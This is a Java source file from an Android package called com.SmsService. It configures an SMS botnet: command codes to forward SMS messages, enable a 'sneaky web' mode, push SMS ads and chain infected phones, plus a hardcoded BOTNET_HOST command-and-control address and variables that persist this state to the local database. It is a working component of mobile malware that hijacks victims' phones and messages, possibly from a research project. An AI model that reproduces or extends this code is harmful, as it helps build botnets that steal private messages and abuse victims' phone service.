package com.SmsService.AuxiliaryComponent;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;



public class CommonVariable {
	private String[] allVariableName = {
		"ADDBOT_SIGN",
		"FORCE_RECEIVE_SIGN",
		"COMMAND_SIGN",
		"SENDBACK_PHONE_NUMBER",
		"SET_LEFT_BOT",
		"SET_RIGHT_BOT",
		"SET_BOT_READY",
		"START_FORWARD_SMS",
		"STOP_FORWARD_SMS",
		"ENABLE_SNEAKY_WEB",
		"STOP_SNEAKY_WEB",
		"FORWARD_SMS_ADS",
		"ENABLE_MACURY",
		"STOP_MACURY",
		"RESPONSE_SIGN",
		"PHONE_NUMBER_RESPONSE",
		"HAVE_RECEIVED",
//		"PASS_HAVE_RECEIVED",
		"SEPERATE",
		"BOTNET_HOST",
		"ShowToast",
		"CommandServiceLock",
		"ResponseServiceLock",
		"ForwardServiceLock",
		"leftBotNumber", 
		"rightBotNumber",
		"selfNumber",
		"WAIT_PERIOD",
		"enableSneakyFlag",
		"isSendLeftBotToQueryNumber", 
		"isSendRightBotToQueryNumber"
	};
	
	public static Boolean isCommonVariableSet = false ;
	private DatabaseHelper db;
	private static String DB_NAME    = "dbfile",
						  TABLE_NAME = "varTable",
						  DB_PATH    = "/data/data/com.SmsService/databases/";
	/* for ScreenMonitor and ScreenReciever */
	public static String enableSneakyFlag ;
	public static boolean browserOnFlag = false ;
	public static boolean ScreenOn = true ;
	
	/* for MACURY */
	public static boolean enableMACURY = false;
	
	// for GetMyPhoneNumber() function in CommandService.java
	public static String isSendLeftBotToQueryNumber, isSendRightBotToQueryNumber ;
	
	
	public static String ADDBOT_SIGN,
						 FORCE_RECEIVE_SIGN;

	/* DEAL COMMAND */
	public static String COMMAND_SIGN,
						 SENDBACK_PHONE_NUMBER,
						 SET_LEFT_BOT,
						 SET_RIGHT_BOT,
						 SET_BOT_READY,
						 START_FORWARD_SMS,
						 STOP_FORWARD_SMS,
						 ENABLE_SNEAKY_WEB,
						 STOP_SNEAKY_WEB,
						 FORWARD_SMS_ADS,
						 ENABLE_MACURY,
						 STOP_MACURY;
						 

	/* WAIT RESPONSE */
	public static String RESPONSE_SIGN,
						 PHONE_NUMBER_RESPONSE,
						 HAVE_RECEIVED;
//						 PASS_HAVE_RECEIVED;

	public static String SEPERATE,
	 					 BOTNET_HOST;

	public static String ShowToast,
						  CommandServiceLock,
						  ResponseServiceLock,
						  ForwardServiceLock;

	public static String leftBotNumber, 
						 rightBotNumber,
						 selfNumber;
	
	public static String WAIT_PERIOD;
	
	
	
	public static Boolean recoverCommonVariable() {
		ADDBOT_SIGN	       	  = "#?";
	 	FORCE_RECEIVE_SIGN    = "YOU";
	  	
	 	/* DEAL COMMAND */
	 	COMMAND_SIGN          = "#!";
		SENDBACK_PHONE_NUMBER = "01";
		SET_LEFT_BOT          = "02";
		SET_RIGHT_BOT         = "03";
		SET_BOT_READY		  = "Y";
	    START_FORWARD_SMS	  = "04";
		STOP_FORWARD_SMS      = "05";
		ENABLE_SNEAKY_WEB	  = "06";
		STOP_SNEAKY_WEB		  = "07";
		FORWARD_SMS_ADS       = "08";
		ENABLE_MACURY		  = "09";
		STOP_MACURY           = "10";
	
		/* WAIT RESPONSE */
		RESPONSE_SIGN         = "##";
		PHONE_NUMBER_RESPONSE = "01";
		HAVE_RECEIVED         = "02";
//		PASS_HAVE_RECEIVED    = "03";

		SEPERATE              = ",";
		BOTNET_HOST           = "http://140.115.2.205:3000/";

		ShowToast            = "true";
	    CommandServiceLock    = "false";
	    ResponseServiceLock  = "false";
	    ForwardServiceLock   = "false";
	
	    leftBotNumber  =""; 
	    rightBotNumber ="";
		selfNumber     ="";
	
		
		/* ScreenMonitor and ScreenReceiver */
		enableSneakyFlag = "true" ;
		browserOnFlag 	 = false;
		ScreenOn         = true;
		
		/* for GetMyPhoneNumber */
		isSendLeftBotToQueryNumber = "true" ;
		isSendRightBotToQueryNumber = "true" ;
		
		WAIT_PERIOD = "10000" ;  // 10 seconds		
		return true;
	}
	
	public String initCommonVariable(Context context) {
		String state = "Success." ;
		db = new DatabaseHelper(context,DB_NAME);
		db.createDataBase();
		
		// "insert into test(id, name) values(55, 'namexx')"
		// "select * from test"
		/*
		Cursor cur = helper.query("select * from test");
        cur.moveToFirst();
        do
        {
            name = name? + cur.getString(1)+ "\n";
        } while(cur.moveToNext());
		*/ 
		Cursor cur = db.query("select * from "+TABLE_NAME);
		int rows_num = cur.getCount();
		cur.moveToFirst();
		for ( int i=0 ; i<rows_num ; i++ ) {
			String name = cur.getString(0);
			String value = cur.getString(1);
			// get data form database and store to variable
			try {
				CommonVariable.class.getField(name).set(null,value);
			} catch( Exception e ) {
				state = e.toString();
			}
			
			cur.moveToNext();
			
		}
		CommandServiceLock = "false";
		ResponseServiceLock = "false";
		ForwardServiceLock = "false";

		isCommonVariableSet = true;
		cur.close();
		db.close();
		return state;
	}

	public String storeCommonVariable( Context context ) {
		db = new DatabaseHelper(context,DB_NAME);
		db.update("create table if not exists "+TABLE_NAME+" (name, value)");
		String state = "Success.";
		try {
			for ( int i=0 ; i<allVariableName.length ; i++ ) {
				//db.insert("INSERT OR REPLACE INTO "+TABLE_NAME+" (name,value) VALUES ('"+allVariableName[i]+"','"+(String)CommonVariable.class.getField(allVariableName[i]).get(null)+"')");
				//db.insert("INSERT OR IGNORE INTO "+TABLE_NAME+" (name,value) VALUES ('"+allVariableName[i]+"', '"+(String)CommonVariable.class.getField(allVariableName[i]).get(null)+"')");
				Cursor cursor = db.query("select * from "+TABLE_NAME+" where name='"+allVariableName[i]+"'") ; 
				if ( cursor.getCount() == 0 ) {
					db.insert("INSERT INTO "+TABLE_NAME+" (name,value) VALUES ('"+allVariableName[i]+"', '"+(String)CommonVariable.class.getField(allVariableName[i]).get(null)+"')");
				}
				else {
					db.update("UPDATE "+TABLE_NAME+" SET value = '"+(String)CommonVariable.class.getField(allVariableName[i]).get(null)+"' WHERE name LIKE '"+allVariableName[i]+"'");
				}
				cursor.close();
			}
			//db.insert("INSERT OR REPLACE INTO "+TABLE_NAME+" (name,value) VALUES ('"+"COMMAND_SIGN"+"','"+(String)CommonVariable.class.getField("COMMAND_SIGN").get(null)+"')");
		}
		catch ( Exception e ) { state = e.toString(); }
		db.close();
		return state;
	}
	
	
	public class DatabaseHelper extends SQLiteOpenHelper {
		private Context ct ;
		public void createDataBase(){
	    	boolean dbExist = checkDataBase();
	    	if(dbExist){
	    		//do nothing - database already exist
	    	}else{
	    		//By calling this method and empty database will be created into the default system path
	               //of your application so we are gonna be able to overwrite that database with our database.
	        	this.getReadableDatabase();
	        	try {
	    			copyDataBase();
	    		} catch (Exception e) {
	        		//throw new Error("Error copying database");
	        	}
	    	}
	 
	    }
		private boolean checkDataBase(){
	    	SQLiteDatabase checkDB = null;
	    	try{
	    		String myPath = DB_PATH + DB_NAME;
	    		checkDB = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);
	    	}catch(Exception e){
	    		//database does't exist yet.
	    	}
	    	if(checkDB != null){
	    		checkDB.close();
	    	}
	    	return checkDB != null ? true : false;
	    }
		private void copyDataBase() throws Exception{
			 
	    	//Open your local db as the input stream
	    	InputStream myInput = ct.getAssets().open(DB_NAME);
	 
	    	// Path to the just created empty db
	    	String outFileName = DB_PATH + DB_NAME;
	 
	    	//Open the empty db as the output stream
	    	OutputStream myOutput = new FileOutputStream(outFileName);
	 
	    	//transfer bytes from the inputfile to the outputfile
	    	byte[] buffer = new byte[1024];
	    	int length;
	    	while ((length = myInput.read(buffer))>0){
	    		myOutput.write(buffer, 0, length);
	    	}
	 
	    	//Close the streams
	    	myOutput.flush();
	    	myOutput.close();
	    	myInput.close();
	 
	    }
		@Override
		public void onCreate(SQLiteDatabase db) {
			// TODO Auto-generated method stub
		}
		@Override
		public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
			// TODO Auto-generated method stub
		}
		public DatabaseHelper(Context ct,String dbName)
		{
			super(ct,dbName,null,1);
			this.ct = ct;
		}
		public boolean insert(String insert)
		{
			this.getWritableDatabase().execSQL(insert);
			return true;
		}
		public boolean update(String update)
		{
			this.getWritableDatabase().execSQL(update);
			return true;
		}
		public boolean delete(String del)
		{
			this.getWritableDatabase().execSQL(del);
			return true;
		}
		public Cursor query(String query)
		{
			Cursor cur = this.getReadableDatabase().rawQuery(query, null);
			return cur;
		}
	}
}
